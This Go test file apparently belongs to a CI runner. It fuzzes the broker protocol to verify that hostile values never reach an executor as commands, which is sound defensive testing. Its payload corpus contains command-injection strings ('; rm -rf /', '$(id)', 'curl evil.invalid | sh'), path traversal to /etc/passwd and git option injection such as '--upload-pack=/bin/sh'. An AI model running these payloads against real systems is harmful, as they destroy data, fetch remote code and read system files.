package invariants

// INV-2 — The broker supplies names, never definitions.
//
// Two thirds of this already pass at the unit level and are not repeated here:
// pkg/protocol/command_test.go pins the closed two-kind command set, and
// internal/registry/admission_test.go pins that a hostile input reaches only
// an environment map. What this file adds is the sentence those two cannot
// reach between them — *no execution occurs outside the registry-declared
// command set* — which is a property of a broker, an admission chain and an
// executor wired together, and is therefore only checkable from outside all
// three.

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/Abyssinia-Labs/latem/pkg/protocol"
)

// hostilePayloads are markers that must never appear in anything offered to an
// executor as a command.
//
// Each is chosen to be a string no legitimate build step in [declaredJobs]
// contains, so a substring search over the recorded commands is a sound
// detector: if one of these turns up in a `Step.Run`, a value from outside the
// trust boundary became part of a command, which is the whole of what INV-2
// forbids.
var hostilePayloads = []string{
	"INV2_PWN",
	"; rm -rf /",
	"$(id)",
	"`id`",
	"&& curl evil.invalid",
	"/bin/sh",
	"../../etc/passwd",
}

// TestINV2_NamesNotDefinitions drives every field of both command kinds with
// hostile values and asserts that nothing outside the registry's own `run:`
// strings was ever offered to an executor.
//
// # The positive control comes first, on purpose
//
// A test asserting "the executor was never asked to run anything bad" passes
// trivially against a harness that never reaches an executor at all — a broken
// socket, a runner that failed preflight, a repository the agent could not
// clone. Four such tests are on record in this project. So the first thing
// this does is run the one legitimate job to completion and check that the
// recorder saw exactly the two declared commands. Everything after it is
// measured against a recorder that has already been shown to have vision.
func TestINV2_NamesNotDefinitions(t *testing.T) {
	m := newMachine(t, machineOptions{})

	// --- positive control: the declared job executes, and is seen ----------
	if got := m.submit(t, runFrame("r_control", "app", "build", "main", nil)); !got.OK {
		t.Fatalf("the legitimate run was refused: %s", got.Error)
	}
	ctl := m.waitForState(t, "r_control", 90*time.Second,
		protocol.StateSucceeded, protocol.StateFailed, protocol.StateRejected)
	if ctl.State != protocol.StateSucceeded {
		t.Fatalf("the control run finished %s (%s): %s", ctl.State, ctl.ErrorCode, ctl.ErrorMsg)
	}
	if got := m.exec.commands(); len(got) != len(declaredCommands) {
		t.Fatalf("the recorder saw %d commands for a two-step job (%q); it is not watching the "+
			"execution path and every assertion below would pass against anything",
			len(got), got)
	}
	baseline := len(m.exec.commands())

	// --- the fuzz -----------------------------------------------------------
	for _, c := range hostileRunCommands() {
		t.Run("run/"+c.name, func(t *testing.T) {
			reply := m.submit(t, c.frame)

			if c.decodable {
				// A well-formed frame carrying a hostile *value* is accepted by
				// the decoder and must be refused by a gate instead — with a
				// code, and without executing anything.
				if !reply.OK {
					return // refused at the transport, which is also fine
				}
				r := m.waitForState(t, c.id, 90*time.Second,
					protocol.StateRejected, protocol.StateFailed, protocol.StateSucceeded,
					protocol.StateAwaitingApproval)
				if r.State == protocol.StateSucceeded && !c.mayBuild {
					t.Errorf("%s succeeded; a hostile %s should not produce a build", c.id, c.name)
				}
				if r.State != protocol.StateSucceeded && c.mayBuild {
					t.Errorf("%s finished %s (%s): %s — §7.1 makes this field display text, so the "+
						"build is supposed to happen and the payload is supposed to be inert",
						c.id, r.State, r.ErrorCode, r.ErrorMsg)
				}
				return
			}

			// A frame the decoder must refuse rather than default.
			if reply.OK {
				t.Errorf("the agent accepted %s\nframe: %s", c.name, c.frame)
			}
		})
	}

	for _, c := range hostileCancelCommands() {
		t.Run("cancel/"+c.name, func(t *testing.T) {
			reply := m.submit(t, c.frame)
			if !c.decodable && reply.OK {
				t.Errorf("the agent accepted %s\nframe: %s", c.name, c.frame)
			}
		})
	}

	// --- the invariant ------------------------------------------------------
	recorded := m.exec.recorded()
	declared := map[string]bool{}
	for _, d := range declaredCommands {
		declared[d] = true
	}

	for i, s := range recorded {
		if !declared[s.Step.Run] {
			t.Errorf("step %d of run %s was asked to execute %q, which no job in the registry "+
				"declares (INV-2)", i, s.RunID, s.Step.Run)
		}
		for _, p := range hostilePayloads {
			if strings.Contains(s.Step.Run, p) {
				t.Errorf("step %d of run %s carries the broker-supplied payload %q in its command "+
					"(INV-2): %q", i, s.RunID, p, s.Step.Run)
			}
			if strings.Contains(s.Step.Name, p) {
				t.Errorf("step %d of run %s carries %q in its name (INV-2): %q",
					i, s.RunID, p, s.Step.Name)
			}
		}
	}

	// Nothing hostile may have provisioned an environment either. A container
	// created for a run that is then rejected is still a resource a broker
	// caused to exist, and §10 rejects before anything starts.
	for _, spec := range m.exec.prepared() {
		for _, p := range hostilePayloads {
			if strings.Contains(spec.Image, p) || strings.Contains(spec.Workspace, p) ||
				strings.Contains(spec.RunID, p) {
				t.Errorf("an environment was provisioned carrying %q: run=%q image=%q workspace=%q",
					p, spec.RunID, spec.Image, spec.Workspace)
			}
		}
	}

	if len(recorded) < baseline {
		t.Fatalf("the recorder lost steps it had already seen (%d < %d)", len(recorded), baseline)
	}
}

// TestINV2_AHostileInputReachesAnEnvironmentMapAndNothingElse is the other half
// of the invariant, and the half a "nothing bad executed" assertion cannot
// distinguish from the run having been dropped entirely.
//
// §5 does not say a hostile input is rejected. It says the broker supplies
// names, never definitions — so a declared input carrying `$(id); rm -rf /` is
// legal data, must arrive in the step's environment intact, and must not
// become any part of a command. A run that quietly refused it would look
// identical to a run that handled it correctly, from the outside.
func TestINV2_AHostileInputReachesAnEnvironmentMapAndNothingElse(t *testing.T) {
	m := newMachine(t, machineOptions{})

	const payload = `INV2_PWN"; rm -rf / #$(id)` + "`id`"
	inputs := map[string]string{"channel": payload}

	if got := m.submit(t, runFrame("r_input", "app", "build", "main", inputs)); !got.OK {
		t.Fatalf("a declared input with a hostile value was refused at the transport: %s", got.Error)
	}
	r := m.waitForState(t, "r_input", 90*time.Second,
		protocol.StateSucceeded, protocol.StateFailed, protocol.StateRejected)
	if r.State != protocol.StateSucceeded {
		t.Fatalf("the run finished %s (%s): %s — a declared input is data, not an attack, and the "+
			"job is supposed to build", r.State, r.ErrorCode, r.ErrorMsg)
	}

	var sawItInEnv bool
	for _, s := range m.exec.recorded() {
		if s.RunID != "r_input" {
			continue
		}
		if s.Step.Run != "./ci/build.sh" && s.Step.Run != "./ci/test.sh" {
			t.Errorf("the run executed %q, which the registry does not declare", s.Step.Run)
		}
		if strings.Contains(s.Step.Run, "INV2_PWN") {
			t.Errorf("the input was interpolated into a command (INV-2, INV-3): %q", s.Step.Run)
		}
		if s.Env["RELEASE_CHANNEL"] == payload {
			sawItInEnv = true
		}
	}
	if !sawItInEnv {
		t.Error("the input never reached the step environment; §9 substitutes ${input.NAME} into " +
			"steps[].env, and a test that only checked commands would pass against a run that " +
			"dropped it")
	}
}

// TestINV2_TheDecoderRefusesEveryKindOutsideTheClosedSet is the mechanical half
// stated at the transport rather than at the type.
//
// pkg/protocol pins this against a decoder call. This drives it down a real
// socket into a real agent, because the property INV-2 claims is that there is
// no third thing a control plane can *say* — and a transport is entitled to
// have its own opinion about a frame before protocol.Command ever sees it.
//
// # Why the refusal message is asserted and not merely the refusal
//
// The local broker's dispatch carries a `default` arm — documented there as
// unreachable, kept so that a third kind added to pkg/protocol without a
// handler is a refusal rather than a silent no-op. It is exactly right to have
// it, and it means "the agent said no" cannot tell you *who* said no. Deleting
// the closed-set check in protocol.Command.Validate leaves this test green if
// it only checks `ok:false`, because the backstop catches every frame the
// decoder stopped catching — verified by doing it. That is the same shape as
// the remote-broker mutation that survived because two code paths were
// indistinguishable, so the wording §5 and pkg/protocol both use is asserted
// here: it is the only thing in the answer that attributes the refusal to the
// trust boundary rather than to the layer behind it.
func TestINV2_TheDecoderRefusesEveryKindOutsideTheClosedSet(t *testing.T) {
	m := newMachine(t, machineOptions{})

	kinds := []string{
		"approve", "deploy", "exec", "shell", "update", "logs", "heartbeat",
		"claim", "ack", "hello", "resume", "RUN", "Run", "run ", "", "null",
	}
	for _, k := range kinds {
		t.Run(fmt.Sprintf("kind=%q", k), func(t *testing.T) {
			frame := fmt.Sprintf(`{"kind":%q,"run":{"id":"r_kind","repo":"app","job":"build",`+
				`"ref":"main","origin":{"kind":"cli","requested_at":"2026-01-01T00:00:00Z"}}}`, k)
			got := m.submit(t, frame)
			if got.OK {
				t.Fatalf("kind %q was accepted; the inbound set is closed at run and cancel "+
					"(INV-2)", k)
			}

			want := "the inbound set is closed"
			if k == "" {
				want = "no kind"
			}
			if !strings.Contains(got.Error, want) {
				t.Errorf("kind %q was refused by something other than the decoder: %q\n"+
					"the answer should contain %q — a refusal from the transport's backstop "+
					"means protocol.Command.Validate no longer closes the set",
					k, got.Error, want)
			}
		})
	}

	// And the run must not exist: a refused frame creates nothing.
	if _, err := m.db.Get(t.Context(), "r_kind"); err == nil {
		t.Error("a refused command kind still created a run row")
	}
}

// ---------------------------------------------------------------------------
// the corpus

type hostileCommand struct {
	name string
	id   string
	// decodable says whether protocol.Command.UnmarshalJSON accepts the frame.
	// A decodable frame carries a hostile *value* and must be stopped by a
	// gate; an undecodable one carries a hostile *shape* and must be stopped
	// by the decoder.
	decodable bool
	// mayBuild marks a frame whose hostile value sits in a field §7.1 defines
	// as display or audit text. Those are data: the run is supposed to build,
	// and the claim is only that the value never becomes part of a command.
	// Asserting a rejection here would be asserting the opposite of the spec.
	mayBuild bool
	frame    string
}

// runFrame builds a well-formed run command.
func runFrame(id, repo, job, ref string, inputs map[string]string) string {
	req := protocol.RunRequest{
		ID:     id,
		Repo:   repo,
		Job:    job,
		Ref:    ref,
		Inputs: inputs,
		Origin: protocol.Origin{Kind: "cli", Actor: "invariants", RequestedAt: time.Unix(0, 0).UTC()},
	}
	b, err := json.Marshal(protocol.NewRunCommand(req))
	if err != nil {
		panic(err)
	}
	return string(b)
}

// hostileRunCommands is the RUNNER_SPEC §5 table, applied to every field of a
// run request rather than only to `ref`.
//
// The shape cases — a smuggled `script`, an `image`, an `executor`, a
// `timeout` — are the ones INV-2 is actually about. §5 does not merely say a
// control plane should not send a command; it says `RunRequest` has no field
// capable of expressing one. These frames are the evidence for that sentence,
// and each must fail at decode rather than being ignored, because a field that
// is silently dropped today is a field somebody wires up tomorrow.
func hostileRunCommands() []hostileCommand {
	const origin = `"origin":{"kind":"cli","requested_at":"2026-01-01T00:00:00Z"}`
	base := func(body string) string { return `{"kind":"run","run":{` + body + `}}` }

	var out []hostileCommand

	// --- fields that must not exist at all ---------------------------------
	for _, f := range []struct{ name, kv string }{
		{"a smuggled script", `"script":"curl evil.invalid | sh"`},
		{"a smuggled command", `"command":"INV2_PWN"`},
		{"a smuggled run", `"run":"./INV2_PWN.sh"`},
		{"a smuggled steps array", `"steps":[{"name":"x","run":"INV2_PWN"}]`},
		{"a smuggled image", `"image":"evil.invalid/INV2_PWN:latest"`},
		{"a smuggled env map", `"env":{"PATH":"/INV2_PWN"}`},
		{"a smuggled executor", `"executor":"native"`},
		{"a smuggled workspace path", `"workspace":"/tmp/INV2_PWN"`},
		{"a smuggled timeout", `"timeout":"99h"`},
		{"a smuggled runs_on override", `"runs_on":["test"]`},
		{"a smuggled cache config", `"caches":[{"name":"x","path":"/INV2_PWN"}]`},
		{"a smuggled shell", `"shell":"/bin/sh"`},
		{"a smuggled secrets list", `"secrets":["MATCH_PASSWORD"]`},
		{"a smuggled artifacts list", `"artifacts":["/etc/passwd"]`},
		{"a smuggled approval", `"approved":true`},
		{"a smuggled sha", `"sha":"0000000000000000000000000000000000000000"`},
	} {
		out = append(out, hostileCommand{
			name:      f.name,
			decodable: false,
			frame: base(`"id":"r_smuggle","repo":"app","job":"build","ref":"main",` +
				origin + `,` + f.kv),
		})
	}

	// --- ids: amendment A6, the field every path is built from -------------
	for i, id := range []string{
		"../../../../tmp/INV2_PWN",
		"..",
		".",
		"r_/../INV2_PWN",
		"r_a/b",
		"r_a\x00b",
		"r_a b",
		"-rf",
		"$(id)",
		"r_" + strings.Repeat("a", 200),
		"",
		"r_a.b",
	} {
		b, err := json.Marshal(id)
		if err != nil {
			panic(err)
		}
		out = append(out, hostileCommand{
			name:      fmt.Sprintf("hostile id %d", i),
			decodable: false,
			frame:     base(`"id":` + string(b) + `,"repo":"app","job":"build","ref":"main",` + origin),
		})
	}

	// --- values that decode and must be stopped by a gate ------------------
	type valueCase struct{ name, id, repo, job, ref string }
	values := []valueCase{
		{"unknown job", "r_v01", "app", "INV2_PWN", "main"},
		{"job naming a path", "r_v02", "app", "../../../bin/sh", "main"},
		{"job with a shell payload", "r_v03", "app", "build; rm -rf /", "main"},
		{"job with substitution", "r_v04", "app", "$(id)", "main"},
		{"job that is a command", "r_v05", "app", "/bin/sh -c INV2_PWN", "main"},
		{"unknown repo", "r_v06", "INV2_PWN", "build", "main"},
		{"repo as a url", "r_v07", "https://evil.invalid/x.git", "build", "main"},
		{"repo as a path", "r_v08", "/etc/passwd", "build", "main"},
		{"repo traversal", "r_v09", "../../app", "build", "main"},
		{"ref option injection", "r_v10", "app", "build", "--upload-pack=/bin/sh"},
		{"ref exec flag", "r_v11", "app", "build", "--exec=/bin/sh"},
		{"ref separator", "r_v12", "app", "build", "main; rm -rf /"},
		{"ref substitution", "r_v13", "app", "build", "$(id)"},
		{"ref traversal", "r_v14", "app", "build", "../../etc/passwd"},
		{"ref newline", "r_v15", "app", "build", "refs/heads/x\nrefs/heads/y"},
		{"ref reflog", "r_v16", "app", "build", "HEAD@{1}"},
		{"ref homoglyph", "r_v17", "app", "build", "refs/heads/mаin"},
		{"ten kilobyte ref", "r_v18", "app", "build", strings.Repeat("a", 10*1024)},
		{"nonexistent ref", "r_v19", "app", "build", "refs/heads/nope"},
		{"empty ref", "r_v20", "app", "build", ""},
		{"empty job", "r_v21", "app", "", "main"},
		{"empty repo", "r_v22", "", "build", "main"},
	}
	for _, v := range values {
		out = append(out, hostileCommand{
			name:      v.name,
			id:        v.id,
			decodable: true,
			frame:     runFrame(v.id, v.repo, v.job, v.ref, nil),
		})
	}

	// --- inputs: undeclared keys are a hard rejection, not a warning -------
	out = append(out,
		hostileCommand{
			name: "undeclared input key", id: "r_v23", decodable: true,
			frame: runFrame("r_v23", "app", "build", "main", map[string]string{"PATH": "/INV2_PWN"}),
		},
		hostileCommand{
			name: "undeclared input naming a command", id: "r_v24", decodable: true,
			frame: runFrame("r_v24", "app", "build", "main",
				map[string]string{"run": "INV2_PWN", "script": "/bin/sh"}),
		},
		hostileCommand{
			name: "input key that is a shell payload", id: "r_v25", decodable: true,
			frame: runFrame("r_v25", "app", "build", "main", map[string]string{"$(id)": "x"}),
		},
	)

	// --- origin is audit and display only ----------------------------------
	out = append(out,
		hostileCommand{
			name: "origin with an unknown field", decodable: false,
			frame: base(`"id":"r_v26","repo":"app","job":"build","ref":"main",` +
				`"origin":{"kind":"cli","requested_at":"2026-01-01T00:00:00Z","script":"INV2_PWN"}`),
		},
		hostileCommand{
			name: "hostile origin actor", id: "r_v27", decodable: true, mayBuild: true,
			frame: base(`"id":"r_v27","repo":"app","job":"build","ref":"main",` +
				`"origin":{"kind":"cli","actor":"INV2_PWN; rm -rf /",` +
				`"requested_at":"2026-01-01T00:00:00Z"}`),
		},
	)

	// --- shape confusion ----------------------------------------------------
	out = append(out,
		hostileCommand{
			name: "run kind carrying a cancel payload", decodable: false,
			frame: `{"kind":"run","cancel":{"id":"r_control"}}`,
		},
		hostileCommand{
			name: "both payloads populated", decodable: false,
			frame: `{"kind":"run","run":{"id":"r_v28","repo":"app","job":"build","ref":"main",` +
				origin + `},"cancel":{"id":"r_control"}}`,
		},
		hostileCommand{
			name: "no payload", decodable: false,
			frame: `{"kind":"run"}`,
		},
		hostileCommand{
			name: "null payload", decodable: false,
			frame: `{"kind":"run","run":null}`,
		},
		hostileCommand{
			name: "unknown envelope field", decodable: false,
			frame: `{"kind":"run","priority":99,"run":{"id":"r_v29","repo":"app","job":"build",` +
				`"ref":"main",` + origin + `}}`,
		},
		hostileCommand{
			name: "not an object", decodable: false,
			frame: `["run"]`,
		},
		hostileCommand{
			name: "not json at all", decodable: false,
			frame: `kind=run;job=INV2_PWN`,
		},
	)

	return out
}

// hostileCancelCommands fuzz the second kind. A cancel carries nothing
// executable, and `reason` is display-only: capped at 200 runes, never
// interpolated, never passed to a shell.
func hostileCancelCommands() []hostileCommand {
	longReason := strings.Repeat("é", 5000)
	return []hostileCommand{
		{name: "smuggled command", decodable: false,
			frame: `{"kind":"cancel","cancel":{"id":"r_control","command":"INV2_PWN"}}`},
		{name: "smuggled signal", decodable: false,
			frame: `{"kind":"cancel","cancel":{"id":"r_control","signal":"KILL"}}`},
		{name: "smuggled force", decodable: false,
			frame: `{"kind":"cancel","cancel":{"id":"r_control","force":true}}`},
		{name: "hostile id", decodable: false,
			frame: `{"kind":"cancel","cancel":{"id":"../../../../tmp/INV2_PWN"}}`},
		{name: "no id", decodable: false,
			frame: `{"kind":"cancel","cancel":{}}`},
		{name: "no payload", decodable: false,
			frame: `{"kind":"cancel"}`},
		{name: "cancel kind carrying a run payload", decodable: false,
			frame: `{"kind":"cancel","run":{"id":"r_x","repo":"app","job":"build","ref":"main",` +
				`"origin":{"kind":"cli","requested_at":"2026-01-01T00:00:00Z"}}}`},
		// A cancel for an id nobody knows is a no-op success by §7.1, and a
		// reason of any length must be truncated rather than refused: it is
		// display text a person typed on a phone.
		{name: "unknown id is a no-op", decodable: true,
			frame: `{"kind":"cancel","cancel":{"id":"r_neverexisted"}}`},
		{name: "five thousand rune reason", decodable: true,
			frame: `{"kind":"cancel","cancel":{"id":"r_control","reason":"` + longReason + `"}}`},
		{name: "reason with a shell payload", decodable: true,
			frame: `{"kind":"cancel","cancel":{"id":"r_control","reason":"INV2_PWN; rm -rf /"}}`},
	}
}
